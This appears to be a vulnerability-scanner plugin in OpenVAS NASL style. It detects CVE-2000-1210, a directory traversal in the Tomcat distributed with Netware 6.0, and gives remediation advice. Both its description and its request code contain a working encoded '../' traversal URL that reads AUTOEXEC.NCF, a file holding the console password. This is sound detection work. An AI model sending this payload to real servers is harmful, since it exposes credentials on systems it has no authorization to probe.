CPE = "cpe:/a:apache:tomcat";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.12119" );
	script_version( "2021-01-20T08:41:35+0000" );
	script_tag( name: "last_modification", value: "2021-01-20 08:41:35 +0000 (Wed, 20 Jan 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2000-1210" );
	script_name( "Netware 6.0 Tomcat source code viewer" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 David Kyger" );
	script_family( "Web Servers" );
	script_dependencies( "gb_apache_tomcat_consolidation.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "apache/tomcat/http/detected" );
	script_tag( name: "solution", value: "Remove default files from the web server. Also, ensure the
  RCONSOLE password is encrypted and utilize a password protected screensaver for console access." );
	script_tag( name: "summary", value: "The Apache Tomcat server distributed with Netware 6.0 has a directory
  traversal vulnerability." );
	script_tag( name: "impact", value: "As a result, sensitive information could be obtained from the Netware server,
  such as the RCONSOLE password located in AUTOEXEC.NCF.

  Example : http://example.com/examples/jsp/source.jsp?%2e%2e/%2e%2e/%2e%2e/%2e%2e/system/autoexec.ncf" );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = "/examples/jsp/source.jsp?%2e%2e/%2e%2e/%2e%2e/%2e%2e/system/autoexec.ncf";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req );
if(ContainsString( buf, "SYS:\\" )){
	report = http_report_vuln_url( port: port, url: url );
	report += "\n\nThe content of the AUTOEXEC.NCF is:\n\n" + buf;
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

